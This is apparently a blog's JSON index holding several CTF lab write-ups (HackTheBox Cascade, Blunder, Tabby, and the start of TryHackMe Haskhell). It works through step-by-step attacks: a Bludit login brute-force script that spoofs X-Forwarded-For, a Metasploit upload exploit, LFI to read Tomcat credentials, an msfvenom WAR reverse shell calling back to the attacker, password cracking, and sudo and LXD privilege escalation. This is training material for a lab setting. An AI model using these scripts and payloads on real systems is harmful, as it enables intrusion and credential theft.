modifyTimeStamp                 : 1/26/2020 2:40:52 AM msDS-LastKnownRDN               : Machine Name                            : Machine                                   DEL:93c23674-e411-400b-bb9f-c0340bda5a34 nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity ObjectCategory                  : ObjectClass                     : container ObjectGUID                      : 93c23674-e411-400b-bb9f-c0340bda5a34 ProtectedFromAccidentalDeletion : False sDRightsEffective               : 0 showInAdvancedViewOnly          : True uSNChanged                      : 196699 uSNCreated                      : 196689 whenChanged                     : 1/26/2020 2:40:52 AM whenCreated                     : 1/26/2020 2:34:31 AM  CanonicalName                   : cascade.local/Deleted Objects/User                                   DEL:746385f2-e3a0-4252-b83a-5a206da0ed88 CN                              : User                                   DEL:746385f2-e3a0-4252-b83a-5a206da0ed88 Created                         : 1/26/2020 2:34:31 AM createTimeStamp                 : 1/26/2020 2:34:31 AM Deleted                         : True Description                     : DisplayName                     : DistinguishedName               : CN=User\\0ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN=Deleted Objects,DC=cascade,DC=local dSCorePropagationData           : {1/1/1601 12:00:00 AM} instanceType                    : 4 isDeleted                       : True LastKnownParent                 : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local Modified                        : 1/26/2020 2:40:52 AM modifyTimeStamp                 : 1/26/2020 2:40:52 AM msDS-LastKnownRDN               : User Name                            : User                                   DEL:746385f2-e3a0-4252-b83a-5a206da0ed88 nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity ObjectCategory                  : ObjectClass                     : container ObjectGUID                      : 746385f2-e3a0-4252-b83a-5a206da0ed88 ProtectedFromAccidentalDeletion : False sDRightsEffective               : 0 showInAdvancedViewOnly          : True uSNChanged                      : 196700 uSNCreated                      : 196690 whenChanged                     : 1/26/2020 2:40:52 AM whenCreated                     : 1/26/2020 2:34:31 AM  accountExpires                  : 9223372036854775807 badPasswordTime                 : 0 badPwdCount                     : 0 CanonicalName                   : cascade.local/Deleted Objects/TempAdmin                                   DEL:f0cc344d-31e0-4866-bceb-a842791ca059 cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz CN                              : TempAdmin                                   DEL:f0cc344d-31e0-4866-bceb-a842791ca059 codePage                        : 0 countryCode                     : 0 Created                         : 1/27/2020 3:23:08 AM createTimeStamp                 : 1/27/2020 3:23:08 AM Deleted                         : True Description                     : DisplayName                     : TempAdmin DistinguishedName               : CN=TempAdmin\\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM} givenName                       : TempAdmin instanceType                    : 4 isDeleted                       : True LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local lastLogoff                      : 0 lastLogon                       : 0 logonCount                      : 0 Modified                        : 1/27/2020 3:24:34 AM modifyTimeStamp                 : 1/27/2020 3:24:34 AM msDS-LastKnownRDN               : TempAdmin Name                            : TempAdmin                                   DEL:f0cc344d-31e0-4866-bceb-a842791ca059 nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity ObjectCategory                  : ObjectClass                     : user ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059 objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136 primaryGroupID                  : 513 ProtectedFromAccidentalDeletion : False pwdLastSet                      : 132245689883479503 sAMAccountName                  : TempAdmin sDRightsEffective               : 0 userAccountControl              : 66048 userPrincipalName               : TempAdmin@cascade.local uSNChanged                      : 237705 uSNCreated                      : 237695 whenChanged                     : 1/27/2020 3:24:34 AM whenCreated                     : 1/27/2020 3:23:08 AM    Found the cascadeLegacyPwd of Tempadmin   cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz     Time to decode..   echo YmFDVDNyMWFOMDBkbGVz|base64 -d  baCT3r1aN00dles —   Logging as ADMIN   evil-winrm -i cascade.htb -u administrator -p baCT3r1aN00dles  Evil-WinRM shell v2.0  Info: Establishing connection to remote endpoint  *Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt;   Getting Root.txt  *Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; cd .. *Evil-WinRM* PS C:\\Users\\Administrator&gt; cd Desktop *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop&gt; type root.txt 930****************************b35b *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop   If you like my work, please do consider giving me +rep on HACKTHEBOX.  My HackTheBox profile: https://www.hackthebox.eu/home/users/profile/291968  ","categories": ["hackthebox"],
        "tags": ["windows,","activedirectory,","evilwinrm,","smb,","rpcclient,","ldapsearch,","dnspy"],
        "url": "/hackthebox/Cascade/",
        "teaser": "/assets/img/sample/cascade/cascade.png"
      },{
        "title": "HackTheBox Blunder",
        "excerpt":"Let’s get started   nmap -sV -sC -Pn -p- -T4 blunder.htb  Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-05 03:56 EDT Nmap scan report for blunder.htb (10.10.10.191) Host is up (0.19s latency). Not shown: 65533 filtered ports PORT   STATE  SERVICE VERSION 21/tcp closed ftp 80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu)) |_http-generator: Blunder |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Blunder | A blunder of interesting facts  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 175.80 seconds   Seeing that Port 80 is open, So I need to ennumerate on only one port..      Using some manual enumeration I found the page blunder.htb/admin which took me to the admin page.          Seeing the name BLUDIT I searched for an exploit online.  https://www.exploit-db.com/exploits/47699  and that has a Metasploit module to it.    MSFCONSOLE  msf5 &gt; search bludit  Matching Modules ================  #  Name                                          Disclosure Date  Rank       Check  Description -  ----                                          ---------------  ----       -----  ----------- 0  exploit/linux/http/bludit_upload_images_exec  2019-09-07       excellent  Yes    Bludit Directory Traversal Image File Upload Vulnerability   Using Gobuster to find some intersting stuff on the page.   Gobuster   gobuster dir -u http://blunder.htb -x txt -s 200 -w /usr/share/dirb/comm.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url:            http://blunder.htb [+] Threads:        10 [+] Wordlist:       /usr/share/dirb/comm.txt [+] Status codes:   200 [+] User Agent:     gobuster/3.0.1 [+] Extensions:     txt [+] Timeout:        10s =============================================================== 2020/07/05 04:03:42 Starting gobuster =============================================================== /todo.txt (Status: 200) =============================================================== 2020/07/05 04:04:26 Finished ===============================================================   Visiting the page blunder.htb/todo.txt      Assuming the username to be Fergus   After trying a bunch of different stuff I found a way to bruteforce the login page blunder.htb/admin with the help of bludit-mitigation-bypass.             https://rastating.github.io/bludit-brute-force-mitigation-bypass/         Bludit Mitigation bypass POC +++++++++++++++++++++++++++++++++ #!/usr/bin/env python3 import re import requests  host = 'http://192.168.194.146/bludit' login_url = host + '/admin/login' username = 'admin' wordlist = []  # Generate 50 incorrect passwords for i in range(50):     wordlist.append('Password{i}'.format(i = i))  # Add the correct password to the end of the list wordlist.append('adminadmin')  for password in wordlist:     session = requests.Session()     login_page = session.get(login_url)     csrf_token = re.search('input.+?name=\"tokenCSRF\".+?value=\"(.+?)\"', login_page.text).group(1)      print('[*] Trying: {p}'.format(p = password))      headers = {         'X-Forwarded-For': password,         'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',         'Referer': login_url     }      data = {         'tokenCSRF': csrf_token,         'username': username,         'password': password,         'save': ''     }      login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)      if 'location' in login_result.headers:         if '/admin/dashboard' in login_result.headers['location']:             print()             print('SUCCESS: Password found!')             print('Use {u}:{p} to login.'.format(u = username, p = password))             print()             break   So to do this I made a custom password list bluditpass.txt using CEWl.   cewl -d 4 -m 5 -w bluditpass.txt --with-numbers http://blunder.htb  CeWL 5.4.6 (Exclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)   viewing the custom passwordlist.   cat bluditpass.txt Plugins service Stadia devices Begin Google games Include Cover image Title Creation November Reading minute Breaked content books Awards Fantasy National button players allows stream Dynamic blunder interesting facts About Stephen American fiction novels which feature series published received World awarded Medal created literature Award range centers through smartphones tablets state users library their other title Blunder description Favicon Bootstrap bootstrap Styles theme Robots plugin Navbar Static pages Social Networks Content Posts Edwin September author horror supernatural suspense fantasy million copies adapted films miniseries television comic including seven under Richard Bachman written approximately short stories collections Stoker British Society Foundation Distinguished Contribution Letters probably fictional character RolandDeschain tower awards contribution entire oeuvre Achievement Grand Master Mystery Writers America United States Endowment contributions described Horror cloud gaming operated capable streaming video resolution frames second support dynamic company numerous across globe provided using sufficiently speed Internet connection accessible Chrome browser desktop computers smart televisions digital media Chromecast integrated YouTube share viewers launch streamer selling point compatible class controllers though proprietary controller manufactured direct available alongside similar Netflix requires purchase rather access While monthly subscription higher rates larger resolutions offer Short universal serial pronounced interface computer communicate peripheral connected cover broad anything keyboards music flash drives information these section power certain charge batteries first commercial release Universal Serial version January industry standard quickly adopted Intel Compaq Microsoft companies Pagination Right Sidebar files nothing Footer Copyright 2019Powered byEgotisticalSW Javascript HackTheBox   As the Password list is ready, it’s time for weaponzation!   Final crafted script………….   #!/usr/bin/env python3 import re import requests #from __future__ import print_function  def open_ressources(file_path):     return [item.replace(\"\\n\", \"\") for item in open(file_path).readlines()]  host = 'http://10.10.10.191' login_url = host + '/admin/login' username = 'fergus' wordlist = open_ressources('bluditpass.txt')  '''# Generate 50 incorrect passwords for i in range(50):     wordlist.append('Password{i}'.format(i = i))  # Add the correct password to the end of the list wordlist.append('adminadmin') ''' for password in wordlist:     session = requests.Session()     login_page = session.get(login_url)     csrf_token = re.search('input.+?name=\"tokenCSRF\".+?value=\"(.+?)\"', login_page.text).group(1)      print('[*] Trying: {p}'.format(p = password))      headers = {         'X-Forwarded-For': password,         'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',         'Referer': login_url     }      data = {         'tokenCSRF': csrf_token,         'username': username,         'password': password,         'save': ''     }      login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)      if 'location' in login_result.headers:         if '/admin/dashboard' in login_result.headers['location']:             print()             print('SUCCESS: Password found!')             print('Use {u}:{p} to login.'.format(u = username, p = password))             print()             break   Time to fire up the bruteforce script..   ./bluditbrute.py  [*] Trying: Plugins [*] Trying: service [*] Trying: Stadia [*] Trying: devices [*] Trying: Begin [*] Trying: Google [*] Trying: games [*] Trying: Include [*] Trying: Cover [*] Trying: image [*] Trying: Title [*] Trying: Creation [*] Trying: November [*] Trying: Reading [*] Trying: minute [*] Trying: Breaked [*] Trying: content [*] Trying: books [*] Trying: Awards [*] Trying: Fantasy [*] Trying: National [*] Trying: button [*] Trying: players [*] Trying: allows [*] Trying: stream [*] Trying: Dynamic [*] Trying: blunder [*] Trying: interesting [*] Trying: facts [*] Trying: About [*] Trying: Stephen [*] Trying: American [*] Trying: fiction [*] Trying: novels [*] Trying: which [*] Trying: feature [*] Trying: series [*] Trying: published [*] Trying: received [*] Trying: World [*] Trying: awarded [*] Trying: Medal [*] Trying: created [*] Trying: literature [*] Trying: Award [*] Trying: range [*] Trying: centers [*] Trying: through [*] Trying: smartphones [*] Trying: tablets [*] Trying: state [*] Trying: users [*] Trying: library [*] Trying: their [*] Trying: other [*] Trying: title [*] Trying: Blunder [*] Trying: description [*] Trying: Favicon [*] Trying: Bootstrap [*] Trying: bootstrap [*] Trying: Styles [*] Trying: theme [*] Trying: Robots [*] Trying: plugin [*] Trying: Navbar [*] Trying: Static [*] Trying: pages [*] Trying: Social [*] Trying: Networks [*] Trying: Content [*] Trying: Posts [*] Trying: Edwin [*] Trying: September [*] Trying: author [*] Trying: horror [*] Trying: supernatural [*] Trying: suspense [*] Trying: fantasy [*] Trying: million [*] Trying: copies [*] Trying: adapted [*] Trying: films [*] Trying: miniseries [*] Trying: television [*] Trying: comic [*] Trying: including [*] Trying: seven [*] Trying: under [*] Trying: Richard [*] Trying: Bachman [*] Trying: written [*] Trying: approximately [*] Trying: short [*] Trying: stories [*] Trying: collections [*] Trying: Stoker [*] Trying: British [*] Trying: Society [*] Trying: Foundation [*] Trying: Distinguished [*] Trying: Contribution [*] Trying: Letters [*] Trying: probably [*] Trying: fictional [*] Trying: character [*] Trying: RolandDeschain  SUCCESS: Password found! Use fergus:RolandDeschain to login.      SUCCESS: Password found! Use fergus:RolandDeschain to login.    Checking the credentials with the login page works!      As all the required credentials are found, its time to step up the game.   Using metasploit to get the initial foothold.   MSFCONSOLE  msf5 &gt; search bludit  Matching Modules ================  #  Name                                          Disclosure Date  Rank       Check  Description -  ----                                          ---------------  ----       -----  ----------- 0  exploit/linux/http/bludit_upload_images_exec  2019-09-07       excellent  Yes    Bludit Directory Traversal Image File Upload Vulnerability   msf5 &gt; use exploit/linux/http/bludit_upload_images_exec msf5 exploit(linux/http/bludit_upload_images_exec) &gt; set rhosts blunder.htb rhosts =&gt; blunder.htb msf5 exploit(linux/http/bludit_upload_images_exec) &gt; set lhost tun0 lhost =&gt; tun0 msf5 exploit(linux/http/bludit_upload_images_exec) &gt; set bludituser fergus bludituser =&gt; fergus msf5 exploit(linux/http/bludit_upload_images_exec) &gt; set bluditpass RolandDeschain bluditpass =&gt; RolandDeschain msf5 exploit(linux/http/bludit_upload_images_exec) &gt; exploit   If the config is set correctly then there should be no problem of getting the meterpreter session.   msf5 exploit(linux/http/bludit_upload_images_exec) &gt; exploit  [*] Started reverse TCP handler on 10.10.14.51:4444  [+] Logged in as: fergus [*] Retrieving UUID... [*] Uploading KtkujjMWRu.png... [*] Uploading .htaccess... [*] Executing KtkujjMWRu.png... [*] Sending stage (38288 bytes) to 10.10.10.191 [*] Meterpreter session 1 opened (10.10.14.51:4444 -&gt; 10.10.10.191:60776) at 2020-07-05 05:10:52 -0400 [+] Deleted .htaccess  meterpreter &gt; shell Process 8846 created. Channel 0 created. python -c 'import pty;pty.spawn(\"/bin/bash\");' www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$   Checking the Users   www-data@blunder:/var/www/bludit-3.9.2/bl-content$ cat /etc/passwd  shaun:x:1000:1000:blunder,,,:/home/shaun:/bin/bash hugo:x:1001:1001:Hugo,1337,07,08,09:/home/hugo:/bin/bash   Enumerating the machine and a bit of googling, the hash of the user is stored in bl-content/databases.   www-data@blunder:/var/www$ cd bludit-3.10.0a cd bludit-3.10.0a www-data@blunder:/var/www/bludit-3.10.0a$ ls ls LICENSE    bl-content  bl-languages  bl-themes  install.php README.md  bl-kernel   bl-plugins    index.php www-data@blunder:/var/www/bludit-3.10.0a$ cd bl-content cd bl-content www-data@blunder:/var/www/bludit-3.10.0a/bl-content$ ls ls databases  pages  tmp  uploads  workspaces www-data@blunder:/var/www/bludit-3.10.0a/bl-content$ cd databases cd databases www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ ls ls categories.php  plugins       site.php    tags.php pages.php       security.php  syslog.php  users.php   Checking with the Users.php found the hash of HUGO.   www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php cat users.php &lt;?php defined('BLUDIT') or die('Bludit CMS.'); ?&gt; {     \"admin\": {         \"nickname\": \"Hugo\",         \"firstName\": \"Hugo\",         \"lastName\": \"\",         \"role\": \"User\",         \"password\": \"faca404fd5c0a31cf1897b823c695c85cffeb98d\",         \"email\": \"\",         \"registered\": \"2019-11-27 07:40:55\",         \"tokenRemember\": \"\",         \"tokenAuth\": \"b380cb62057e9da47afce66b4615107d\",         \"tokenAuthTTL\": \"2009-03-15 14:00\",         \"twitter\": \"\",         \"facebook\": \"\",         \"instagram\": \"\",         \"codepen\": \"\",         \"linkedin\": \"\",         \"github\": \"\",         \"gitlab\": \"\"} }   Cracking the hash oh HUGO!      Logging in as HUGO.   www-data@blunder:/home$ su hugo su hugo Password: Password120 hugo@blunder:~$   Grabbing User.txt   hugo@blunder:~$ cat user.txt cat user.txt d******************************a   Time for Privilege Escalation.   Checking the sudo permissions of hugo   hugo@blunder:~$ sudo -l sudo -l Password: Password120  Matching Defaults entries for hugo on blunder:     env_reset, mail_badpass,     secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin  User hugo may run the following commands on blunder:     (ALL, !root) /bin/bash      Escalation of privilege is so simple and stright forward!           https://www.hackingarticles.in/category/privilege-escalation/    hugo@blunder:~$  sudo -u#-1 /bin/bash   root@blunder:/# whoami whoami root   Grabbing Root.txt   root@blunder:/root# cat root.txt cat root.txt 8******************************f   If you like my work, please do consider giving me +rep on HACKTHEBOX.  My HackTheBox profile: https://www.hackthebox.eu/home/users/profile/291968  ","categories": ["hackthebox"],
        "tags": ["linux,","gobuster,","bludit"],
        "url": "/hackthebox/Blunder/",
        "teaser": "/assets/img/sample/blunder/blunder.png"
      },{
        "title": "HackTheBox Tabby",
        "excerpt":"Let’s get started                  Column                               Detail                                       OS:                                               Linux                 Difficulty:                                               Easy                 Points:                                               20                 Release:                                               20 Jun 2020                 IP:                                               10.10.10.194           As always hacking starts with NMAP scan.   Starting Nmap 7.80 ( https://nmap.org ) Discovered open port 80/tcp on 10.10.10.194 Discovered open port 8080/tcp on 10.10.10.194 Discovered open port 22/tcp on 10.10.10.194 Completed SYN Stealth Scan at 07:52, 2.07s elapsed (1000 total ports) Not shown: 997 closed ports PORT     STATE SERVICE VERSION 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu)) |_http-favicon: Unknown favicon MD5: 338ABBB5EA8D80B9869555ECA253D49D | http-methods:  |_  Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Mega Hosting 8080/tcp open  http    Apache Tomcat | http-methods:  |_  Supported Methods: OPTIONS GET HEAD POST |_http-open-proxy: Proxy might be redirecting requests |_http-title: Apache Tomcat No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.80%E=4%D=6/21%OT=22%CT=1%CU=41896%PV=Y%DS=2%DC=T%G=Y%TM=5EEF000 OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1 OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S)  Uptime guess: 12.366 days (since Tue Jun  9 00:49:25 2020) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=261 (Good luck!) IP ID Sequence Generation: All zeros Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  TRACEROUTE (using port 995/tcp) HOP RTT       ADDRESS 1   128.32 ms 10.10.14.1 2   128.88 ms 10.10.10.194  NSE: Script Post-scanning. Initiating NSE at 09:36 Completed NSE at 09:36, 0.00s elapsed Initiating NSE at 09:36 Completed NSE at 09:36, 0.00s elapsed Initiating NSE at 09:36 Completed NSE at 09:36, 0.00s elapsed Read data files from: /usr/bin/../share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 31.88 seconds            Raw packets sent: 1289 (61.746KB) | Rcvd: 1410 (433.356KB)  On visiting the port 80 there is a website Megahosting.HTB with some content on it.      So I desided to add megahosting.htb to  /etc/hosts in my kali.      10.10.10.194 tabby.htb megahosting.htb    After all the things are done, then I came to see that a URL ` http://megahosting.htb/news.php?file=statement looks like LFI` is going to work out.      LFI   A file inclusion vulnerability is a type of web vulnerability that is most commonly found to affect web applications that rely on a scripting run time.   So I was able to get the /etc/passwd by doing so http://megahosting.htb/news.php?file=../.../etc/passwd. we get directory traversal.   root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false tomcat:x:997:997::/opt/tomcat:/bin/false mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false ash:x:1000:1000:clive:/home/ash:/bin/bash   Now visiting the other part of the http webpage 8080, which is a single page running tomcat server.      Seeing that page, i felt that LFI should work on this page too.   If LFI works in the right way as intended, then the credentials should be found in tomcat-users.xml.   After a little bit of research and directory fuzzing I came to see that the correct path is /usr/share/tomcat9/etc/tomcat-users.xml   Going to the source-code of the url: I was able to find the cred of the user.   http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml     &lt;role rolename=\"admin-gui\"/&gt;    &lt;role rolename=\"manager-script\"/&gt;    &lt;user username=\"tomcat\" password=\"$3cureP4s5w0rd123!\" roles=\"admin-gui,manager-script\"/&gt;  Getting Foothold   Time for creating the backdoor.   There are two ways of doing this. This is my of doing it.   Uploading a payload as .war file can give us the reverse shell.   Crafting the payload with msfvenom.      msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.X.X LPORT=5566 -f war &gt; payload.war    Try to use LPORT as some thing other than 1234 because there are lot of users hacking the same machine!..   Time to upload the payload now.   curl --user 'tomcat:$3cureP4s5w0rd123!' --upload-file payload.war \"http://10.10.10.194:8080/manager/text/deploy?path=/payload.war\"   When you see ok that means the payload has been uploaded successfully.      Now set up listener nc -lvnp 5566 and go to tabby.htb:8080/payload.war and you should get a reverse shell.   use python -c 'import pty;pty.spawn(\"/bin/bash\")' for the shell upgrade.   tomcat@tabby:/var/www/html/files$ ls ls 16162020_backup.zip  archive  revoked_certs  statement tomcat@tabby:/var/www/html/files$   Privilege escalation to User ASH   Ennumeration on /var/www/html there is a folder called files which contains a backup.zip file 16162020_backup.zip   tomcat@tabby:/var/www/html/files$ ls -la ls -la total 36 drwxr-xr-x 4 ash  ash  4096 Jun 17 21:59 . drwxr-xr-x 4 root root 4096 Jun 17 16:24 .. -rw-r--r-- 1 ash  ash  8716 Jun 16 13:42 16162020_backup.zip   So I tried extracting it, but it is password protected.   Cracking the password with JOHN.   zip2john 16162020_backup.zip &gt;&gt; backup-hash 16162020_backup.zip/var/www/html/assets/ is not encrypted! ver 1.0 16162020_backup.zip/var/www/html/assets/ is not encrypted, or stored with non-handled compression type ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/favicon.ico PKZIP Encr: 2b chk, TS_chk, cmplen=338, decmplen=766, crc=282B6DE2 ver 1.0 16162020_backup.zip/var/www/html/files/ is not encrypted, or stored with non-handled compression type ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/index.php PKZIP Encr: 2b chk, TS_chk, cmplen=3255, decmplen=14793, crc=285CC4D6 ver 1.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/logo.png PKZIP Encr: 2b chk, TS_chk, cmplen=2906, decmplen=2894, crc=2F9F45F ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/news.php PKZIP Encr: 2b chk, TS_chk, cmplen=114, decmplen=123, crc=5C67F19E ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/Readme.txt PKZIP Encr: 2b chk, TS_chk, cmplen=805, decmplen=1574, crc=32DB9CE3 NOTE: It is assumed that all files in each archive have the same password. If that is not the case, the hash may be uncrackable. To avoid this, use option -o to pick a file at a time.   Trying to crack the hash with the help of rockyou.txt.   john backup-hash -w=/usr/share/wordlists/rockyou.txt   and the password is admin@it .   Unzipping the file with the password found.   unzip 16162020_backup.zip  Archive:  16162020_backup.zip    creating: var/www/html/assets/ [16162020_backup.zip] var/www/html/favicon.ico password:    inflating: var/www/html/favicon.ico      creating: var/www/html/files/   inflating: var/www/html/index.php    extracting: var/www/html/logo.png      inflating: var/www/html/news.php      inflating: var/www/html/Readme.txt  Bad luck! That was a Rabbit hole..   So I used the password admin@it with the user ash.    su - ash Password: admin@it ash@tabby:~$ whoami whoami ash  Getting User.txt   ash@tabby:~$ cat user.txt cat user.txt d**********1   Privilege Escalation to Root.      Checking the id of ash    ash@tabby:~$ id id uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)   We see that ash is part of lxd group. So according to article https://www.hackingarticles.in/lxd-privilege-escalation/ I just followed the steps and got root .   As there are many ways on priv esc using LXD I took help of hackingarticles for it.    git clone  https://github.com/saghul/lxd-alpine-builder.git cd lxd-alpine-builder ./build-alpine    You will get a tar.gz file. Set up http server and copy it to the remote machine.      python -m SimpleHTTPServer 8080    On another hand we will download the alpine-image inside /tmp directory on the host machine.      cd /tmp wget http://10.10.14.17:8080/apline-v3.10-x86_64-20191008_1227.tar.gz    After the image is built it can be added as an image to LXD as follows:   lxc image import ./apline-v3.10-x86_64-20191008_1227.tar.gz --alias myimage lxc image list   lxc init myimage ignite -c security.privileged=true lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true lxc start ignite lxc exec ignite /bin/sh id   ``` shell\t cd /mnt/root/root cd /mnt/root/root /mnt/root/root # cat root.txt cat root.txt 3**********5     If you like my work, please do consider giving me +rep on HACKTHEBOX.  My HackTheBox profile: https://www.hackthebox.eu/home/users/profile/291968  ","categories": ["hackthebox"],
        "tags": ["linux,","gobuster,","lfi,","john,","tomcat,","lxd"],
        "url": "/hackthebox/Tabby/",
        "teaser": "/assets/img/sample/tabby/tabby.png"
      },{
        "title": "Tryhackme Haskhell",
        "excerpt":"Nmap Scan.    nmap -sV -sC -Pn -p- -T4 hask.thm  Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-08 03:30 EDT Nmap scan report for hask.thm (10.10.129.213) Host is up (0.16s latency). Not shown: 65533 closed ports PORT     STATE SERVICE VERSION 22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey:  |   2048 1d:f3:53:f7:6d:5b:a1:d4:84:51:0d:dd:66:40:4d:90 (RSA) |   256 26:7c:bd:33:8f:bf:09:ac:9e:e3:d3:0a:c3:34:bc:14 (ECDSA) |_  256 d5:fb:55:a0:fd:e8:e1:ab:9e:46:af:b8:71:90:00:26 (ED25519) 5001/tcp open  http    Gunicorn 19.7.1 |_http-server-header: gunicorn/19.7.1 |_http-title: Homepage Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 657.29 seconds   From the Nmap scan I can see that port 5001 is the only useful port that can be enumerated.   Having a look on the http site @ 5001 I come to see this page      Seeing the hyperlink homework here I clicked on it and it took me to the page where an assignment can be submitted.      Clicking on the submit button it says that PAGE NOT FOUND.      Using Gobuster to find the directories of the machine.   Gobuster   root@Ac3:~# gobuster dir -u http://hask.thm:5001/ -w /usr/share/dirb/wordlists/common.txt  